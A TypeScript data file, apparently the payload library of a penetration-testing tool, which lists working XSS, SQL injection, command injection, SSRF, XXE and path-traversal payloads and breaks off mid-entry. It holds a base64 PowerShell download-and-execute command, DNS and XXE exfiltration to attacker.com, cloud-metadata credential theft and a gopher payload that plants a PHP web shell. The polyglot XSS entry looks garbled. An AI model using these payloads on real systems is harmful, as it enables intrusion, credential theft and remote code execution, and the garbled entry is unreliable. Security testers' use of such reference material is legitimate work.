// ============================================================================
// DAEDALUS ARMORY — Built-in Payload & Exploit Reference Library
// Sources: PayloadsAllTheThings, SecLists concepts, LOLBAS, GTFOBins patterns
// ============================================================================

export interface Payload {
  id: string
  name: string
  category: string
  subcategory: string
  description: string
  payload: string
  tags: string[]
  platform: ('web' | 'windows' | 'linux' | 'macos')[]
  riskLevel: 'low' | 'medium' | 'high' | 'critical'
  references?: string[]
}

export type PayloadCategory =
  | 'xss'
  | 'sqli'
  | 'cmdi'
  | 'ssrf'
  | 'xxe'
  | 'lfi'
  | 'ssti'
  | 'auth'
  | 'revshell'
  | 'lolbins'

export const CATEGORY_META: Record<PayloadCategory, { label: string; color: string; bgColor: string; icon: string }> = {
  xss:      { label: 'XSS',              color: 'text-purple-bright',  bgColor: 'bg-purple-core/10',     icon: 'Code2' },
  sqli:     { label: 'SQL Injection',     color: 'text-violet-vivid',   bgColor: 'bg-violet-core/10',     icon: 'Database' },
  cmdi:     { label: 'Command Injection', color: 'text-status-error',   bgColor: 'bg-status-error/10',    icon: 'Terminal' },
  ssrf:     { label: 'SSRF',             color: 'text-purple-bright',  bgColor: 'bg-purple-core/10',     icon: 'Globe' },
  xxe:      { label: 'XXE',              color: 'text-violet-vivid',   bgColor: 'bg-violet-core/10',     icon: 'FileCode2' },
  lfi:      { label: 'Path Traversal / LFI', color: 'text-status-warning', bgColor: 'bg-status-warning/10', icon: 'FolderOpen' },
  ssti:     { label: 'SSTI',             color: 'text-purple-bright',  bgColor: 'bg-purple-core/10',     icon: 'Braces' },
  auth:     { label: 'Auth Bypass',      color: 'text-status-error',   bgColor: 'bg-status-error/10',    icon: 'ShieldOff' },
  revshell: { label: 'Reverse Shells',   color: 'text-status-error',   bgColor: 'bg-status-error/10',    icon: 'Wifi' },
  lolbins:  { label: 'LOLBins / GTFOBins', color: 'text-status-warning', bgColor: 'bg-status-warning/10', icon: 'Cog' },
}

let _id = 0
function pid(): string {
  return `p${++_id}`
}

// ============================================================================
// 1. XSS — Cross-Site Scripting (20 payloads)
// ============================================================================

const XSS_PAYLOADS: Payload[] = [
  {
    id: pid(), name: 'Basic Alert', category: 'xss', subcategory: 'Basic',
    description: 'Simplest XSS proof of concept using script tags.',
    payload: `<script>alert(document.domain)</script>`,
    tags: ['basic', 'script-tag', 'poc'], platform: ['web'], riskLevel: 'medium',
  },
  {
    id: pid(), name: 'IMG OnError', category: 'xss', subcategory: 'Event Handler',
    description: 'XSS via broken image onerror event handler.',
    payload: `<img src=x onerror=alert(document.domain)>`,
    tags: ['img', 'onerror', 'event-handler'], platform: ['web'], riskLevel: 'medium',
  },
  {
    id: pid(), name: 'SVG OnLoad', category: 'xss', subcategory: 'SVG',
    description: 'XSS via inline SVG onload event.',
    payload: `<svg onload=alert(document.domain)>`,
    tags: ['svg', 'onload'], platform: ['web'], riskLevel: 'medium',
  },
  {
    id: pid(), name: 'SVG Animate XSS', category: 'xss', subcategory: 'SVG',
    description: 'XSS through SVG animate element with event handlers.',
    payload: `<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>`,
    tags: ['svg', 'animate', 'onbegin'], platform: ['web'], riskLevel: 'medium',
  },
  {
    id: pid(), name: 'Body OnLoad', category: 'xss', subcategory: 'Event Handler',
    description: 'XSS via body tag onload attribute.',
    payload: `<body onload=alert(document.domain)>`,
    tags: ['body', 'onload', 'event-handler'], platform: ['web'], riskLevel: 'medium',
  },
  {
    id: pid(), name: 'Input OnFocus Autofocus', category: 'xss', subcategory: 'Event Handler',
    description: 'Auto-triggering XSS with onfocus and autofocus.',
    payload: `<input onfocus=alert(document.domain) autofocus>`,
    tags: ['input', 'onfocus', 'autofocus', 'auto-trigger'], platform: ['web'], riskLevel: 'medium',
  },
  {
    id: pid(), name: 'Details/Summary OnToggle', category: 'xss', subcategory: 'Event Handler',
    description: 'XSS via details element ontoggle event.',
    payload: `<details open ontoggle=alert(document.domain)><summary>click</summary></details>`,
    tags: ['details', 'ontoggle'], platform: ['web'], riskLevel: 'medium',
  },
  {
    id: pid(), name: 'Marquee OnStart', category: 'xss', subcategory: 'Event Handler',
    description: 'XSS using deprecated marquee tag onstart event.',
    payload: `<marquee onstart=alert(document.domain)>`,
    tags: ['marquee', 'onstart', 'deprecated'], platform: ['web'], riskLevel: 'low',
  },
  {
    id: pid(), name: 'JavaScript Protocol href', category: 'xss', subcategory: 'Protocol',
    description: 'XSS via javascript: protocol in anchor href.',
    payload: `<a href="javascript:alert(document.domain)">click</a>`,
    tags: ['javascript-protocol', 'href', 'anchor'], platform: ['web'], riskLevel: 'medium',
  },
  {
    id: pid(), name: 'JavaScript Protocol Case Bypass', category: 'xss', subcategory: 'Protocol',
    description: 'Bypass case-sensitive filters with mixed case javascript protocol.',
    payload: `<a href="JaVaScRiPt:alert(document.domain)">click</a>`,
    tags: ['javascript-protocol', 'case-bypass', 'waf-bypass'], platform: ['web'], riskLevel: 'medium',
  },
  {
    id: pid(), name: 'DOM XSS innerHTML Sink', category: 'xss', subcategory: 'DOM-Based',
    description: 'DOM-based XSS via innerHTML sink with location.hash source.',
    payload: `document.getElementById('x').innerHTML = location.hash.slice(1);\n// Trigger: https://target.com/page#<img src=x onerror=alert(1)>`,
    tags: ['dom-xss', 'innerhtml', 'sink', 'source'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'DOM XSS document.write', category: 'xss', subcategory: 'DOM-Based',
    description: 'DOM-based XSS via document.write with URL parameter source.',
    payload: `document.write('<img src="' + new URLSearchParams(location.search).get('img') + '">');\n// Trigger: ?img=x" onerror="alert(1)`,
    tags: ['dom-xss', 'document-write', 'sink'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'CSP Bypass via JSONP', category: 'xss', subcategory: 'CSP Bypass',
    description: 'Bypass Content Security Policy using whitelisted JSONP endpoints.',
    payload: `<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>`,
    tags: ['csp-bypass', 'jsonp', 'callback'], platform: ['web'], riskLevel: 'high',
    references: ['CSP Bypass via JSONP'],
  },
  {
    id: pid(), name: 'CSP Bypass via base-uri', category: 'xss', subcategory: 'CSP Bypass',
    description: 'CSP bypass when base-uri is not restricted, hijacking relative script paths.',
    payload: `<base href="https://attacker.com/">\n<!-- Relative script paths will now load from attacker.com -->`,
    tags: ['csp-bypass', 'base-uri', 'base-tag'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Polyglot XSS', category: 'xss', subcategory: 'Polyglot',
    description: 'Multi-context XSS payload that works across HTML, JS, and attribute contexts.',
    payload: `jaVasCript:/*-/*\`/*\\/*'/*"/**/(/* */oNcliCk=alert(document.domain) )//%%0telerik0telerik11telerik/telerik/>`,
    tags: ['polyglot', 'multi-context', 'waf-bypass'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Template Literal XSS', category: 'xss', subcategory: 'Template Literal',
    description: 'XSS via ES6 template literals with expression interpolation.',
    payload: '${alert(document.domain)}',
    tags: ['template-literal', 'es6', 'interpolation'], platform: ['web'], riskLevel: 'medium',
  },
  {
    id: pid(), name: 'Mutation XSS (mXSS) via noscript', category: 'xss', subcategory: 'Mutation XSS',
    description: 'Mutation-based XSS exploiting browser HTML parser differences with noscript.',
    payload: `<noscript><p title="</noscript><img src=x onerror=alert(document.domain)>">`,
    tags: ['mxss', 'mutation', 'parser-differential', 'noscript'], platform: ['web'], riskLevel: 'high',
    references: ['DOMPurify bypass'],
  },
  {
    id: pid(), name: 'Mutation XSS via math/style', category: 'xss', subcategory: 'Mutation XSS',
    description: 'mXSS payload abusing math namespace and style elements.',
    payload: `<math><mtext><table><mglyph><style><!--</style><img title="-->&lt;img src=x onerror=alert(1)&gt;">`,
    tags: ['mxss', 'mutation', 'math', 'namespace'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'OnMouseOver Div', category: 'xss', subcategory: 'Event Handler',
    description: 'XSS triggered on mouse hover over a styled div element.',
    payload: `<div style="width:100%;height:100%;position:fixed;top:0;left:0;" onmouseover=alert(document.domain)>hover</div>`,
    tags: ['onmouseover', 'event-handler', 'full-page'], platform: ['web'], riskLevel: 'medium',
  },
  {
    id: pid(), name: 'Iframe srcdoc XSS', category: 'xss', subcategory: 'Iframe',
    description: 'XSS via iframe srcdoc attribute with HTML-encoded payload.',
    payload: `<iframe srcdoc="&lt;script&gt;alert(parent.document.domain)&lt;/script&gt;">`,
    tags: ['iframe', 'srcdoc', 'html-encoding'], platform: ['web'], riskLevel: 'high',
  },
]

// ============================================================================
// 2. SQL Injection (18 payloads)
// ============================================================================

const SQLI_PAYLOADS: Payload[] = [
  {
    id: pid(), name: 'UNION SELECT (MySQL)', category: 'sqli', subcategory: 'Union-Based',
    description: 'MySQL UNION-based injection to extract data. Adjust column count as needed.',
    payload: `' UNION SELECT 1,2,3,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()-- -`,
    tags: ['union', 'mysql', 'information-schema'], platform: ['web'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'UNION SELECT (MSSQL)', category: 'sqli', subcategory: 'Union-Based',
    description: 'MSSQL UNION-based injection querying system tables.',
    payload: `' UNION SELECT 1,2,name FROM sysobjects WHERE xtype='U'--`,
    tags: ['union', 'mssql', 'sysobjects'], platform: ['web', 'windows'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'UNION SELECT (PostgreSQL)', category: 'sqli', subcategory: 'Union-Based',
    description: 'PostgreSQL UNION injection querying pg_tables.',
    payload: `' UNION SELECT 1,2,string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'--`,
    tags: ['union', 'postgresql', 'pg-tables'], platform: ['web', 'linux'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'UNION SELECT (Oracle)', category: 'sqli', subcategory: 'Union-Based',
    description: 'Oracle UNION injection using dual table and all_tables.',
    payload: `' UNION SELECT NULL,table_name FROM all_tables WHERE ROWNUM<=10--`,
    tags: ['union', 'oracle', 'all-tables'], platform: ['web'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'UNION SELECT (SQLite)', category: 'sqli', subcategory: 'Union-Based',
    description: 'SQLite UNION injection querying sqlite_master.',
    payload: `' UNION SELECT 1,sql FROM sqlite_master WHERE type='table'--`,
    tags: ['union', 'sqlite', 'sqlite-master'], platform: ['web'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Boolean Blind (MySQL)', category: 'sqli', subcategory: 'Blind',
    description: 'Boolean-based blind SQLi extracting data one character at a time.',
    payload: `' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -`,
    tags: ['blind', 'boolean', 'mysql', 'substring'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Time-Based Blind (MySQL)', category: 'sqli', subcategory: 'Blind',
    description: 'Time-based blind SQLi using SLEEP() conditional.',
    payload: `' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -`,
    tags: ['blind', 'time-based', 'mysql', 'sleep'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Time-Based Blind (MSSQL)', category: 'sqli', subcategory: 'Blind',
    description: 'MSSQL time-based blind injection with WAITFOR DELAY.',
    payload: `'; IF (SELECT SUBSTRING(DB_NAME(),1,1))='a' WAITFOR DELAY '0:0:5'--`,
    tags: ['blind', 'time-based', 'mssql', 'waitfor'], platform: ['web', 'windows'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Error-Based (MySQL ExtractValue)', category: 'sqli', subcategory: 'Error-Based',
    description: 'MySQL error-based injection using ExtractValue() for data exfiltration.',
    payload: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -`,
    tags: ['error-based', 'mysql', 'extractvalue'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Error-Based (MSSQL Convert)', category: 'sqli', subcategory: 'Error-Based',
    description: 'MSSQL error-based injection forcing type conversion errors.',
    payload: `' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--`,
    tags: ['error-based', 'mssql', 'convert'], platform: ['web', 'windows'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Stacked Queries (MSSQL)', category: 'sqli', subcategory: 'Stacked Queries',
    description: 'MSSQL stacked query injection to execute arbitrary SQL statements.',
    payload: `'; EXEC xp_cmdshell 'whoami';--`,
    tags: ['stacked', 'mssql', 'xp-cmdshell', 'rce'], platform: ['web', 'windows'], riskLevel: 'critical',
    references: ['xp_cmdshell'],
  },
  {
    id: pid(), name: 'OOB via DNS (MySQL)', category: 'sqli', subcategory: 'Out-of-Band',
    description: 'Out-of-band data exfiltration via DNS lookup on MySQL/Windows.',
    payload: `' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.attacker.com\\\\a'))-- -`,
    tags: ['oob', 'dns', 'mysql', 'load-file'], platform: ['web', 'windows'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'WAF Bypass: Inline Comments', category: 'sqli', subcategory: 'WAF Bypass',
    description: 'Bypass WAF rules using MySQL inline comments to break up keywords.',
    payload: `'/*!50000UNION*//*!50000SELECT*/1,2,3-- -`,
    tags: ['waf-bypass', 'inline-comments', 'mysql'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'WAF Bypass: Double URL Encoding', category: 'sqli', subcategory: 'WAF Bypass',
    description: 'Double URL encoding to evade WAF input normalization.',
    payload: `%252527%252520UNION%252520SELECT%2525201,2,3-- -`,
    tags: ['waf-bypass', 'double-encoding', 'url-encode'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'WAF Bypass: Case + Whitespace', category: 'sqli', subcategory: 'WAF Bypass',
    description: 'Mixed case with alternative whitespace characters for WAF bypass.',
    payload: `'%09UnIoN%0aSeLeCt%0d1,2,3-- -`,
    tags: ['waf-bypass', 'case-manipulation', 'whitespace'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Second-Order SQLi', category: 'sqli', subcategory: 'Second-Order',
    description: 'Payload stored in DB, triggered when used in a different query later.',
    payload: `admin'-- -\n/* Register with this username, then login. The stored value is used unsafely in a subsequent query. */`,
    tags: ['second-order', 'stored', 'delayed'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'NoSQL Injection (MongoDB)', category: 'sqli', subcategory: 'NoSQL',
    description: 'MongoDB NoSQL injection via JSON operator injection.',
    payload: `{"username": {"$gt": ""}, "password": {"$gt": ""}}`,
    tags: ['nosql', 'mongodb', 'operator-injection', 'json'], platform: ['web'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'NoSQL Injection (MongoDB regex)', category: 'sqli', subcategory: 'NoSQL',
    description: 'MongoDB injection using $regex for password enumeration.',
    payload: `{"username": "admin", "password": {"$regex": "^a"}}`,
    tags: ['nosql', 'mongodb', 'regex', 'enumeration'], platform: ['web'], riskLevel: 'high',
  },
]

// ============================================================================
// 3. Command Injection (12 payloads)
// ============================================================================

const CMDI_PAYLOADS: Payload[] = [
  {
    id: pid(), name: 'Semicolon Chaining', category: 'cmdi', subcategory: 'Basic',
    description: 'Command injection via semicolon to chain a second command.',
    payload: `; id`,
    tags: ['semicolon', 'basic', 'chaining'], platform: ['linux', 'macos'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Pipe Injection', category: 'cmdi', subcategory: 'Basic',
    description: 'Pipe output of legitimate command into attacker command.',
    payload: `| id`,
    tags: ['pipe', 'basic'], platform: ['linux', 'macos'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'AND Chaining', category: 'cmdi', subcategory: 'Basic',
    description: 'Execute second command only if first succeeds.',
    payload: `&& id`,
    tags: ['and', 'chaining', 'conditional'], platform: ['linux', 'macos', 'windows'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'OR Chaining', category: 'cmdi', subcategory: 'Basic',
    description: 'Execute second command if first fails (useful when first command errors).',
    payload: `|| id`,
    tags: ['or', 'chaining', 'conditional'], platform: ['linux', 'macos', 'windows'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Backtick Execution', category: 'cmdi', subcategory: 'Substitution',
    description: 'Command substitution using backticks.',
    payload: '`id`',
    tags: ['backtick', 'substitution'], platform: ['linux', 'macos'], riskLevel: 'critical',
  },
  {
    id: pid(), name: '$() Subshell', category: 'cmdi', subcategory: 'Substitution',
    description: 'Command substitution using $() subshell syntax.',
    payload: `$(id)`,
    tags: ['subshell', 'substitution', 'dollar-paren'], platform: ['linux', 'macos'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Newline Injection', category: 'cmdi', subcategory: 'Newline',
    description: 'Inject command via URL-encoded newline character.',
    payload: `%0aid`,
    tags: ['newline', 'url-encoded', 'line-break'], platform: ['linux', 'macos'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Blind CMDi (Sleep)', category: 'cmdi', subcategory: 'Blind',
    description: 'Blind command injection confirmed via time delay.',
    payload: `; sleep 10`,
    tags: ['blind', 'sleep', 'time-based'], platform: ['linux', 'macos'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Blind CMDi (DNS OOB)', category: 'cmdi', subcategory: 'Blind',
    description: 'Blind command injection with out-of-band DNS exfiltration.',
    payload: `; nslookup $(whoami).attacker.com`,
    tags: ['blind', 'dns', 'oob', 'exfiltration'], platform: ['linux', 'macos'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Blind CMDi (Ping OOB)', category: 'cmdi', subcategory: 'Blind',
    description: 'Blind command injection confirmed via ICMP ping to attacker.',
    payload: `; ping -c 3 attacker.com`,
    tags: ['blind', 'ping', 'icmp', 'oob'], platform: ['linux', 'macos'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Windows cmd.exe Injection', category: 'cmdi', subcategory: 'Windows',
    description: 'Command injection targeting Windows cmd.exe with & separator.',
    payload: `& whoami`,
    tags: ['windows', 'cmd', 'ampersand'], platform: ['windows'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'PowerShell Injection', category: 'cmdi', subcategory: 'Windows',
    description: 'Command injection via PowerShell IEX with encoded command.',
    payload: `; powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AYwBvAG0ALwBzAGgAZQBsAGwALgBwAHMAMQAnACkA`,
    tags: ['powershell', 'encoded', 'iex', 'download'], platform: ['windows'], riskLevel: 'critical',
  },
]

// ============================================================================
// 4. SSRF — Server-Side Request Forgery (12 payloads)
// ============================================================================

const SSRF_PAYLOADS: Payload[] = [
  {
    id: pid(), name: 'Localhost Basic', category: 'ssrf', subcategory: 'Internal Access',
    description: 'Basic SSRF to access localhost services.',
    payload: `http://127.0.0.1:80/admin`,
    tags: ['localhost', 'basic', 'internal'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'IPv6 Localhost', category: 'ssrf', subcategory: 'Internal Access',
    description: 'SSRF using IPv6 loopback to bypass IPv4 filters.',
    payload: `http://[::1]:80/admin`,
    tags: ['ipv6', 'localhost', 'filter-bypass'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'AWS Metadata (IMDSv1)', category: 'ssrf', subcategory: 'Cloud Metadata',
    description: 'Access AWS EC2 instance metadata service (IMDSv1) for credentials.',
    payload: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
    tags: ['aws', 'metadata', 'imds', 'credentials', 'cloud'], platform: ['web', 'linux'], riskLevel: 'critical',
    references: ['AWS IMDSv1'],
  },
  {
    id: pid(), name: 'AWS Metadata (IMDSv2)', category: 'ssrf', subcategory: 'Cloud Metadata',
    description: 'AWS IMDSv2 requires a PUT request for token first.',
    payload: `# Step 1: Get token\ncurl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"\n# Step 2: Use token\ncurl -H "X-aws-ec2-metadata-token: TOKEN" http://169.254.169.254/latest/meta-data/`,
    tags: ['aws', 'metadata', 'imdsv2', 'token', 'cloud'], platform: ['web', 'linux'], riskLevel: 'high',
    references: ['AWS IMDSv2'],
  },
  {
    id: pid(), name: 'GCP Metadata', category: 'ssrf', subcategory: 'Cloud Metadata',
    description: 'Access Google Cloud Platform instance metadata for service account tokens.',
    payload: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n# Requires header: Metadata-Flavor: Google`,
    tags: ['gcp', 'google', 'metadata', 'cloud', 'service-account'], platform: ['web', 'linux'], riskLevel: 'critical',
    references: ['GCP Metadata API'],
  },
  {
    id: pid(), name: 'Azure Metadata', category: 'ssrf', subcategory: 'Cloud Metadata',
    description: 'Access Azure Instance Metadata Service for managed identity tokens.',
    payload: `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\n# Requires header: Metadata: true`,
    tags: ['azure', 'metadata', 'cloud', 'managed-identity', 'oauth'], platform: ['web', 'windows', 'linux'], riskLevel: 'critical',
    references: ['Azure IMDS'],
  },
  {
    id: pid(), name: 'DNS Rebinding', category: 'ssrf', subcategory: 'Bypass',
    description: 'DNS rebinding attack to bypass SSRF allowlist/denylist validation.',
    payload: `http://A.8.8.8.8.1time.127.0.0.1.1time.repeat.rebind.network/`,
    tags: ['dns-rebinding', 'bypass', 'ttl'], platform: ['web'], riskLevel: 'high',
    references: ['DNS Rebinding'],
  },
  {
    id: pid(), name: 'URL @ Symbol Bypass', category: 'ssrf', subcategory: 'Bypass',
    description: 'Bypass URL validation using @ symbol to redirect to attacker-controlled host.',
    payload: `http://allowed-domain.com@attacker.com/`,
    tags: ['url-parser', 'at-symbol', 'bypass'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'URL Fragment Bypass', category: 'ssrf', subcategory: 'Bypass',
    description: 'Use URL fragment (#) to trick parsers into accepting internal URLs.',
    payload: `http://allowed-domain.com#@127.0.0.1/admin`,
    tags: ['url-parser', 'fragment', 'bypass'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Encoded Slashes Bypass', category: 'ssrf', subcategory: 'Bypass',
    description: 'Double-encoded slashes to bypass path-based SSRF filters.',
    payload: `http://127.0.0.1/%252f%252fadmin`,
    tags: ['double-encoding', 'slashes', 'bypass'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Gopher Protocol', category: 'ssrf', subcategory: 'Protocol Smuggling',
    description: 'Use gopher:// protocol to send arbitrary TCP data (e.g., Redis commands).',
    payload: `gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A`,
    tags: ['gopher', 'redis', 'protocol-smuggling', 'rce'], platform: ['web', 'linux'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'File Protocol', category: 'ssrf', subcategory: 'Protocol Smuggling',
    description: 'Use file:// protocol to read local files via SSRF.',
    payload: `file:///etc/passwd`,
    tags: ['file-protocol', 'lfi', 'local-read'], platform: ['web', 'linux'], riskLevel: 'high',
  },
]

// ============================================================================
// 5. XXE — XML External Entity (10 payloads)
// ============================================================================

const XXE_PAYLOADS: Payload[] = [
  {
    id: pid(), name: 'Basic File Read (Linux)', category: 'xxe', subcategory: 'File Read',
    description: 'Classic XXE to read /etc/passwd using external entity.',
    payload: `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<data>&xxe;</data>`,
    tags: ['basic', 'file-read', 'linux', 'etc-passwd'], platform: ['web', 'linux'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Basic File Read (Windows)', category: 'xxe', subcategory: 'File Read',
    description: 'XXE to read Windows system files.',
    payload: `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">\n]>\n<data>&xxe;</data>`,
    tags: ['basic', 'file-read', 'windows', 'win-ini'], platform: ['web', 'windows'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Blind XXE OOB (HTTP)', category: 'xxe', subcategory: 'Blind / OOB',
    description: 'Blind XXE with out-of-band HTTP exfiltration via external DTD.',
    payload: `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">\n  %xxe;\n]>\n<data>&send;</data>\n\n<!-- evil.dtd on attacker server: -->\n<!-- <!ENTITY % file SYSTEM "file:///etc/passwd"> -->\n<!-- <!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/?d=%file;'>"> -->\n<!-- %eval; -->`,
    tags: ['blind', 'oob', 'external-dtd', 'exfiltration'], platform: ['web', 'linux'], riskLevel: 'critical',
  },
  {
    id: pid(), name: 'Blind XXE OOB (DNS)', category: 'xxe', subcategory: 'Blind / OOB',
    description: 'Blind XXE detection via DNS exfiltration.',
    payload: `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://unique-id.attacker.com/">\n]>\n<data>&xxe;</data>`,
    tags: ['blind', 'oob', 'dns', 'detection'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Error-Based XXE', category: 'xxe', subcategory: 'Error-Based',
    description: 'XXE that forces an error containing file contents in the error message.',
    payload: `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM "file:///etc/passwd">\n  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">\n  %eval;\n  %error;\n]>`,
    tags: ['error-based', 'file-read', 'error-message'], platform: ['web', 'linux'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Parameter Entity Abuse', category: 'xxe', subcategory: 'Parameter Entity',
    description: 'XXE using parameter entities when regular entities are blocked.',
    payload: `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY % a SYSTEM "file:///etc/passwd">\n  <!ENTITY % b "<!ENTITY &#x25; c SYSTEM 'http://attacker.com/?d=%a;'>">\n  %b;\n  %c;\n]>`,
    tags: ['parameter-entity', 'bypass', 'exfiltration'], platform: ['web', 'linux'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'SVG-Based XXE', category: 'xxe', subcategory: 'File Format',
    description: 'XXE embedded in an SVG file upload.',
    payload: `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">\n  <text x="10" y="20">&xxe;</text>\n</svg>`,
    tags: ['svg', 'file-upload', 'image'], platform: ['web', 'linux'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'XLSX XXE (xl/workbook.xml)', category: 'xxe', subcategory: 'File Format',
    description: 'XXE injected into XLSX (Excel) file via modified workbook.xml inside the ZIP.',
    payload: `<!-- Unzip .xlsx, inject into xl/workbook.xml: -->\n<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<workbook>\n  <sheets>\n    <sheet name="&xxe;" sheetId="1" />\n  </sheets>\n</workbook>`,
    tags: ['xlsx', 'excel', 'file-upload', 'zip'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'DOCX XXE (word/document.xml)', category: 'xxe', subcategory: 'File Format',
    description: 'XXE injected into DOCX (Word) file via modified document.xml inside the ZIP.',
    payload: `<!-- Unzip .docx, inject into word/document.xml: -->\n<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">\n  <w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>\n</w:document>`,
    tags: ['docx', 'word', 'file-upload', 'zip'], platform: ['web'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'XXE via SOAP Request', category: 'xxe', subcategory: 'Protocol',
    description: 'XXE injected into a SOAP XML request body.',
    payload: `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n  <soap:Body>\n    <getData>&xxe;</getData>\n  </soap:Body>\n</soap:Envelope>`,
    tags: ['soap', 'api', 'web-service'], platform: ['web'], riskLevel: 'high',
  },
]

// ============================================================================
// 6. Path Traversal / LFI (12 payloads)
// ============================================================================

const LFI_PAYLOADS: Payload[] = [
  {
    id: pid(), name: 'Basic ../ Traversal', category: 'lfi', subcategory: 'Basic',
    description: 'Classic directory traversal to read /etc/passwd.',
    payload: `../../../../../../../../etc/passwd`,
    tags: ['basic', 'dot-dot-slash', 'linux'], platform: ['web', 'linux'], riskLevel: 'high',
  },
  {
    id: pid(), name: 'Null Byte Injection', category: 'lfi', subcategory: 'Bypass',
    description: 'Null byte to truncate appended file extension (PHP < 5.3.4).',
